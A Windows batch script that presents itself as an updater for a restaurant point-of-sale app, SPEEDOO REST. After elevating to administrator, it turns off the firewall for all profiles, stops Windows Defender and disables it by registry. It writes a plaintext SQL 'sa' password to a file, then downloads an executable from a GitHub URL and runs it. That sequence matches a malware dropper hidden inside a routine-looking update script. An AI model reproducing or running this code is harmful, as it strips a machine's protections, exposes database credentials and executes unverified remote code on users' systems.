@echo off
@REM --------------------> Run Batch As Admin <--------------------
setlocal
REM check if file Run Us Admin
openfiles >nul 2>&1
if '%errorlevel%' == '0' goto main
powershell -Command "Start-Process cmd -ArgumentList '/c \"%~dp0%~nx0\"' -Verb RunAs"
exit /b
:main
REM ------------Set Firewall off
netsh advfirewall set publicprofile state off
netsh advfirewall set currentprofile state off
netsh advfirewall set domainprofile state off
netsh advfirewall set allprofiles state off
netsh advfirewall set privateprofile state off
REM ------------------stop windefend
net stop windefend
Reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
@REM ---------------- Varibals ------------------------
set "Shortcut_Part=SPEEDOO REST"
set "UserDesktop=%USERPROFILE%\Desktop"
set "TargetPath="
@REM ---------------- Extract speedo file path ------------------------
:serch_Shortcut
for %%F in ("%UserDesktop%\%Shortcut_Part%*.lnk") do (
    for /f "delims=" %%A in ('powershell -command "(New-Object -ComObject WScript.Shell).CreateShortcut('%%F').TargetPath"') do (
        set "FullPath=%%A"
        set "FolderPath=%%~dpA"
        goto :found
    )
)
@REM -------------------------> Prompt for path if shortcut is not found
if not defined TargetPath (
    set "Shortcut_Part=RESTAURANT_APP"
    goto serch_Shortcut
    
)
:found
if "%FolderPath:~-1%"=="\" set "FolderPath=%FolderPath:~0,-1%"
set "Update_File=C:\MySettingRESTAURANT\Update\"
mkdir %Update_File%DatabaseBackup
mkdir %Update_File%LastVersion
mkdir %Update_File%OldVersion
set   Update_Exe_Patt=%Update_File%Update_Exe
mkdir %Update_Exe_Patt%
@REM ---------------- creat Info.txt------------------------
set "InfoPath=%Update_File%Info.txt"
echo ConnectionString=Data Source=.\SALES_DEV;Initial Catalog=RESTAURANT_DB;User ID=sa;Password=12345;Integrated Security=False > "%InfoPath%"
echo Speedoo_Location=%FolderPath% >> "%InfoPath%"
echo destinationPath=C:\MySettingRESTAURANT\Update\LastVersion\SPEEDOO-REST-3.0.5.0-UPDATE.zip >> "%InfoPath%"
echo Compress_Location=C:\MySettingRESTAURANT\Update\OldVersion\ >> "%InfoPath%"
echo Db_Location=C:\MySettingRESTAURANT\Update\DatabaseBackup\ >> "%InfoPath%"
echo DATABASE_NAME=RESTAURANT_DB >> "%InfoPath%"
@REM ---------------- creat Update.txt------------------------
set "UpdatePath=%Update_File%Update.txt"
echo url = https://www.dropbox.com/scl/fi/oq9tam4xtsi3z689yxry3/3.0.6.2.zip? > "%UpdatePath%"
echo rlkey=yv1o4df79hpnrgbdi48lxqi7m&st=jc89lerj&dl=1 >> "%UpdatePath%"
echo url_exe_update = https://www.dropbox.com/scl/fi/hk5wm1ijnmgqry1af57ou/UPDATE_REST.exe?>> "%UpdatePath%"
echo rlkey=fqeddol3j48w0t8dfeueuvjxs&st=c6hhq0cv&dl=1>> "%UpdatePath%"
echo version_exe_update = 1.0.0.5 >> "%UpdatePath%"
echo appName = RESTAURANT_APP >> "%UpdatePath%"
echo Latest_Version = 3.0.5.0 >> "%UpdatePath%"
echo Current_Version = 3.0.4.9 >> "%UpdatePath%"
cls
echo File created successfully at %InfoPath%
echo File created successfully at %UpdatePath%
@REM ---------------- download UPDATE_REST.exe ------------------------
:download
set "url=https://raw.githubusercontent.com/Iraqsoft95/rest_ubdate/refs/heads/main/UPDATE_REST.exe"
set "output_file=%Update_Exe_Patt%\UPDATE_REST.exe"
echo Downloading UPDATE_REST.exe...
curl -L -o "%output_file%" "%url%"
if %errorlevel% neq 0 (
    echo Download interrupted. Retrying...
    timeout /t 10
    goto download
)
start "" "%output_file%"
echo Download completed.
pause
